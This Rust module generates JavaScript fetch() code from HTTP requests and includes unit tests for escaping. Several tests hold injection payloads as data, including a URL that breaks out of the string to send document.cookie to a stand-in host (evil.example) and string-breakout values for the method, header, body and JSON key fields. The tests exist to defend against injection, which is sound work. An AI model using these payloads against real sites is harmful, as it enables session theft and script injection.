//! JavaScript code generation (using fetch API)

use super::CodegenRequest;

/// Generate JavaScript code using the fetch API
pub fn generate_javascript(request: &CodegenRequest) -> String {
    let mut lines = Vec::new();

    // Headers object
    let has_headers = !request.headers.is_empty();
    let has_body = request
        .body
        .as_ref()
        .map(|b| !b.trim().is_empty())
        .unwrap_or(false);

    // Options object
    lines.push("const options = {".to_string());
    lines.push(format!(
        "  method: '{}',",
        escape_js_string(&request.method)
    ));

    if has_headers {
        lines.push("  headers: {".to_string());
        for (key, value) in &request.headers {
            lines.push(format!(
                "    '{}': '{}',",
                escape_js_string(key),
                escape_js_string(value)
            ));
        }
        lines.push("  },".to_string());
    }

    if has_body && let Some(body) = &request.body {
        // Check if it's JSON
        let is_json = request
            .headers
            .iter()
            .any(|(k, v)| k.eq_ignore_ascii_case("content-type") && v.contains("application/json"));

        if is_json {
            // Try to format as JavaScript object
            if let Ok(json_val) = serde_json::from_str::<serde_json::Value>(body) {
                lines.push(format!(
                    "  body: JSON.stringify({}),",
                    json_to_js(&json_val, 2)
                ));
            } else {
                lines.push(format!("  body: '{}',", escape_js_string(body)));
            }
        } else {
            lines.push(format!("  body: '{}',", escape_js_string(body)));
        }
    }

    lines.push("};".to_string());
    lines.push(String::new());

    // Fetch call
    lines.push(format!(
        "fetch('{}', options)",
        escape_js_string(&request.url)
    ));
    lines.push("  .then(response => response.json())".to_string());
    lines.push("  .then(data => console.log(data))".to_string());
    lines.push("  .catch(error => console.error('Error:', error));".to_string());

    lines.join("\n")
}

fn escape_js_string(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('\'', "\\'")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}

/// Render a JSON object key as an object-literal key. Only keys that are
/// plain JS identifiers may be emitted bare; anything else (dashes, spaces,
/// unicode, quotes) must be a quoted+escaped string literal, otherwise the
/// key either produces invalid JS or breaks out of the object literal.
fn js_object_key(key: &str) -> String {
    let mut chars = key.chars();
    let is_identifier = chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_' || c == '$')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '$');
    if is_identifier {
        key.to_string()
    } else {
        format!("'{}'", escape_js_string(key))
    }
}

fn json_to_js(value: &serde_json::Value, indent: usize) -> String {
    let spaces = " ".repeat(indent);
    match value {
        serde_json::Value::Null => "null".to_string(),
        serde_json::Value::Bool(b) => b.to_string(),
        serde_json::Value::Number(n) => n.to_string(),
        serde_json::Value::String(s) => format!("'{}'", escape_js_string(s)),
        serde_json::Value::Array(arr) => {
            if arr.is_empty() {
                "[]".to_string()
            } else {
                let items: Vec<String> = arr.iter().map(|v| json_to_js(v, 0)).collect();
                format!("[{}]", items.join(", "))
            }
        }
        serde_json::Value::Object(obj) => {
            if obj.is_empty() {
                "{}".to_string()
            } else {
                let items: Vec<String> = obj
                    .iter()
                    .map(|(k, v)| format!("{}{}: {}", spaces, js_object_key(k), json_to_js(v, 0)))
                    .collect();
                format!(
                    "{{\n{}\n{}}}",
                    items.join(",\n"),
                    " ".repeat(indent.saturating_sub(2))
                )
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_simple_get() {
        let request = CodegenRequest::new("GET", "https://api.example.com/users");
        let code = generate_javascript(&request);
        assert!(code.contains("method: 'GET'"));
        assert!(code.contains("fetch('https://api.example.com/users'"));
        assert!(code.contains(".then(response =>"));
    }

    #[test]
    fn test_post_with_json() {
        let request = CodegenRequest::new("POST", "https://api.example.com/users")
            .with_headers(vec![(
                "Content-Type".to_string(),
                "application/json".to_string(),
            )])
            .with_body(Some(r#"{"name": "John"}"#.to_string()));
        let code = generate_javascript(&request);
        assert!(code.contains("method: 'POST'"));
        assert!(code.contains("JSON.stringify"));
        assert!(code.contains("name: 'John'"));
    }

    #[test]
    fn test_with_headers() {
        let request = CodegenRequest::new("GET", "https://api.example.com").with_headers(vec![(
            "Authorization".to_string(),
            "Bearer token".to_string(),
        )]);
        let code = generate_javascript(&request);
        assert!(code.contains("headers: {"));
        assert!(code.contains("'Authorization': 'Bearer token'"));
    }

    #[test]
    fn test_url_injection_is_escaped() {
        // A malicious URL containing a single quote could break out of the
        // fetch() string argument and inject arbitrary JS.
        let request = CodegenRequest::new(
            "GET",
            "https://example.com/'); fetch('https://evil.example/steal?d='+document.cookie); ('",
        );
        let code = generate_javascript(&request);
        assert!(!code.contains(
            "fetch('https://example.com/'); fetch('https://evil.example/steal?d='+document.cookie); ('', options)"
        ));
        assert!(code.contains("\\'"));
    }

    #[test]
    fn test_method_injection_is_escaped() {
        // HttpMethod::Custom allows arbitrary free text for the method.
        let request = CodegenRequest::new("GET', headers: {'X-Injected", "https://example.com");
        let code = generate_javascript(&request);
        assert!(!code.contains("method: 'GET', headers: {'X-Injected',"));
    }

    #[test]
    fn test_header_key_injection_is_escaped() {
        let request = CodegenRequest::new("GET", "https://example.com").with_headers(vec![(
            "X-Evil': 'x', 'X-Injected".to_string(),
            "value".to_string(),
        )]);
        let code = generate_javascript(&request);
        assert!(!code.contains("'X-Evil': 'x', 'X-Injected': 'value',"));
    }

    #[test]
    fn test_json_body_key_injection_is_escaped() {
        // JSON object keys become object-literal keys. A bare key can
        // contain arbitrary JS (`x: 1, injected: alert(1)`), so any key that
        // is not a plain identifier must be quoted and escaped.
        let body = serde_json::json!({ "x: 1, injected": 2 }).to_string();
        let request = CodegenRequest::new("POST", "https://example.com")
            .with_headers(vec![(
                "Content-Type".to_string(),
                "application/json".to_string(),
            )])
            .with_body(Some(body));
        let code = generate_javascript(&request);
        assert!(
            !code.contains("  x: 1, injected: 2"),
            "JSON key was spliced in as raw JS: {}",
            code
        );
        assert!(
            code.contains("'x: 1, injected': 2"),
            "non-identifier JSON key should be quoted: {}",
            code
        );
    }

    #[test]
    fn test_non_identifier_json_keys_are_quoted() {
        // `content-type` as a bare object key is a subtraction expression,
        // not a key - it must be quoted for the snippet to even parse.
        let body = serde_json::json!({ "content-type": "a", "🙂": "b" }).to_string();
        let request = CodegenRequest::new("POST", "https://example.com")
            .with_headers(vec![(
                "Content-Type".to_string(),
                "application/json".to_string(),
            )])
            .with_body(Some(body));
        let code = generate_javascript(&request);
        assert!(code.contains("'content-type':"), "{}", code);
        assert!(code.contains("'🙂':"), "{}", code);
    }

    #[test]
    fn test_body_injection_is_escaped() {
        let request = CodegenRequest::new("POST", "https://example.com").with_body(Some(
            "', evil: fetch('https://evil.example'), x: '".to_string(),
        ));
        let code = generate_javascript(&request);
        assert!(
            !code.contains("body: '', evil: fetch('https://evil.example'), x: '',"),
            "body broke out of the JS string literal: {}",
            code
        );
        assert!(code.contains("\\'"), "{}", code);
    }

    #[test]
    fn test_header_value_injection_is_escaped() {
        let request = CodegenRequest::new("GET", "https://example.com").with_headers(vec![(
            "X-Token".to_string(),
            "v', 'X-Injected': 'yes".to_string(),
        )]);
        let code = generate_javascript(&request);
        assert!(
            !code.contains("'X-Token': 'v', 'X-Injected': 'yes',"),
            "header value broke out of the headers object: {}",
            code
        );
    }

    #[test]
    fn test_newlines_in_body_do_not_break_the_literal() {
        let request = CodegenRequest::new("POST", "https://example.com")
            .with_body(Some("a\nalert(1)\nb".to_string()));
        let code = generate_javascript(&request);
        let body_line = code
            .lines()
            .find(|l| l.trim_start().starts_with("body: "))
            .expect("body line present");
        assert!(
            body_line.contains("a\\nalert(1)\\nb"),
            "newlines must be escaped: {:?}",
            body_line
        );
    }
}
